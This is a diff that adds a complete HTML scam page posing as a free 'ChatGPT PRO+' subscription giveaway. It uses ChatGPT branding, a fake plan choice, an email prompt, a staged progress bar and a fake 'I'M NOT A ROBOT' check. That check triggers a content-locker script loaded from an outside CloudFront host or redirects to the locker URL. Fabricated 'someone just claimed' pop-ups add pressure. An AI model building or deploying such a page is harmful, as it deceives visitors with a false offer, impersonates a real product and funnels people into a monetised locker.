@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChatGPT PRO+ | Neural Access 2026</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #10a37f; --bg: #000; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body, html { height: 100%; background: var(--bg); color: white; overflow: hidden; }
+
+        /* BINDI ANIMATION BACKGROUND */
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.5; }
+        .wrapper { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { width: 90%; max-width: 420px; background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); border-radius: 25px; padding: 35px 25px; text-align: center; box-shadow: 0 30px 60px rgba(0,0,0,0.8); }
+
+        .header-logo { width: 60px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--primary)); }
+        #step-email, #step-processing, #step-captcha { display: none; }
+        h1 { font-size: 22px; margin-bottom: 20px; font-weight: 900; }
+
+        .options-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 25px; }
+        .plan-card { background: #111; border: 2px solid #333; padding: 20px 10px; border-radius: 15px; cursor: pointer; transition: 0.3s; position: relative; }
+        .plan-card.selected { border-color: var(--primary); background: rgba(16, 163, 127, 0.1); }
+        .tick-icon { position: absolute; top: 10px; right: 10px; width: 16px; height: 16px; border-radius: 50%; border: 1px solid #444; }
+        .selected .tick-icon { background: var(--primary); border-color: var(--primary); }
+
+        input[type="email"] { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #333; background: #000; color: white; margin-bottom: 20px; text-align: center; font-size: 16px; outline: none; }
+        .main-btn { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.3s; }
+        .main-btn:disabled { opacity: 0.4; }
+
+        .progress-bg { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; margin-top: 20px; }
+        .progress-fill { width: 0%; height: 100%; background: var(--primary); }
+        #status-msg { font-size: 11px; color: var(--primary); margin-top: 10px; font-family: monospace; }
+        
+        .proof { position: fixed; bottom: 20px; left: 20px; background: white; color: black; padding: 10px 15px; border-radius: 10px; font-size: 12px; font-weight: bold; z-index: 1000; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+    </style>
+</head>
+<body>
+    <canvas id="bg-canvas"></canvas>
+    <div class="wrapper">
+        <div class="container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" class="header-logo">
+            
+            <div id="step-plans">
+                <h1>Select Access</h1>
+                <div class="options-grid">
+                    <div class="plan-card" onclick="selectPlan(this)">
+                        <div class="tick-icon"></div>
+                        <h3>1 Month</h3>
+                        <p>Trial</p>
+                    </div>
+                    <div class="plan-card" onclick="selectPlan(this)">
+                        <div class="tick-icon"></div>
+                        <h3>1 Year</h3>
+                        <p>Neural+</p>
+                    </div>
+                </div>
+                <button class="main-btn" id="planBtn" disabled onclick="showE()">NEXT STEP</button>
+            </div>
+
+            <div id="step-email">
+                <h1>User Identity</h1>
+                <input type="email" id="uEmail" placeholder="Enter Gmail/Email">
+                <button class="main-btn" onclick="startP()">CLAIM NOW</button>
+            </div>
+
+            <div id="step-processing">
+                <h1>Processing...</h1>
+                <div class="progress-bg"><div class="progress-fill" id="bar"></div></div>
+                <div id="status-msg">Connecting to Neural Link...</div>
+            </div>
+
+            <div id="step-captcha">
+                <h1 style="color:#ff4b4b;">Verify Humanity</h1>
+                <button class="main-btn" style="background:white; color:black;" onclick="openL()">I'M NOT A ROBOT</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="p-wrap"></div>
+    <audio id="tSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>
+
+    <script type="text/javascript">
+        var akvzP_XHK_JSOzFc={"it":4559230,"key":"41579"};
+    </script>
+    <script src="https://d19k1sh57v5k0g.cloudfront.net/dd0208c.js"></script>
+
+    <script>
+        // BACKGROUND
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let dots = [];
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        for(let i=0; i<60; i++) dots.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: Math.random()*2, v: Math.random()*0.4});
+        function draw() {
+            ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = '#10a37f';
+            dots.forEach(d => {
+                ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill();
+                d.y -= d.v; if(d.y < 0) d.y = canvas.height;
+            });
+            requestAnimationFrame(draw);
+        }
+        draw();
+
+        function selectPlan(el) {
+            document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
+            el.classList.add('selected');
+            document.getElementById('planBtn').disabled = false;
+            document.getElementById('tSound').play();
+        }
+
+        function showE() {
+            document.getElementById('step-plans').style.display='none';
+            document.getElementById('step-email').style.display='block';
+        }
+
+        function startP() {
+            if(!document.getElementById('uEmail').value.includes('@')) return alert("Valid Email Required");
+            document.getElementById('step-email').style.display='none';
+            document.getElementById('step-processing').style.display='block';
+            let w = 0;
+            const b = document.getElementById('bar');
+            const iv = setInterval(() => {
+                w += 1; b.style.width = w + "%";
+                if(w >= 100) { clearInterval(iv); document.getElementById('step-processing').style.display='none'; document.getElementById('step-captcha').style.display='block'; }
+            }, 40);
+        }
+
+        // LOCKER TRIGGER
+        function openL() {
+            if (typeof call_locker === "function") {
+                call_locker();
+            } else if (typeof og_load === "function") {
+                og_load();
+            } else {
+                // If script is blocked, go to direct URL
+                window.location.href = "https://d19k1sh57v5k0g.cloudfront.net/cl/i/41579";
+            }
+        }
+
+        // PROOFS
+        setInterval(() => {
+            const wrap = document.getElementById('p-wrap');
+            wrap.innerHTML = `<div class="proof">🇺🇸 Someone from NY just claimed 1 Year Pro+</div>`;
+            setTimeout(() => wrap.innerHTML = '', 3000);
+        }, 8000);
+    </script>
+</body>
+</html>
